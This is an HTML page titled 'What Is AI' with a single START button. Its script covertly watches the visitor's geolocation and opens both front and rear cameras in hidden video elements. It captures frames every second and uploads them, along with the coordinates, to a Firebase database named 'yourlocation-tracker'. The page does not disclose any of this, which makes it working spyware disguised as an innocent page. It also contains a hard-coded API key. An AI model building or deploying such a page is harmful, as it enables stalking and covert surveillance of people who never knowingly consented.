<!DOCTYPE html>
<html>
<head>
<title>What Is AI</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
background:black;
color:white;
text-align:center;
font-family:Arial;
padding-top:100px;
}

h1{
font-size:55px;
margin-bottom:50px;
}

button{
font-size:40px;
padding:20px 60px;
border:none;
border-radius:10px;
background:lime;
color:black;
font-weight:bold;
}

video{
display:none;
}

</style>

</head>
<body>

<h1>WHAT IS AI SYSTEM</h1>

<button onclick="startSystem()">START</button>

<video id="frontCam" autoplay playsinline></video>
<video id="backCam" autoplay playsinline></video>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceId="phone_"+Math.floor(Math.random()*100000);

function startSystem(){

// LOCATION TRACK
navigator.geolocation.watchPosition(function(pos){

firebase.database().ref("devices/"+deviceId+"/location").set({
lat:pos.coords.latitude,
lon:pos.coords.longitude
});

});

// FRONT CAMERA
navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
})
.then(stream=>{

let video=document.getElementById("frontCam");

video.srcObject=stream;

video.onloadedmetadata=function(){

video.play();

startCapture(video,"front");

};

});

// BACK CAMERA
navigator.mediaDevices.getUserMedia({
video:{facingMode:"environment"}
})
.then(stream=>{

let video=document.getElementById("backCam");

video.srcObject=stream;

video.onloadedmetadata=function(){

video.play();

startCapture(video,"back");

};

});

}

function startCapture(video,type){

let canvas=document.createElement("canvas");

let ctx=canvas.getContext("2d");

setInterval(()=>{

if(video.videoWidth===0) return;

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

ctx.drawImage(video,0,0);

let img=canvas.toDataURL("image/jpeg",0.7);

firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
img:img
});

},1000);

}

</script>

</body>
</html>
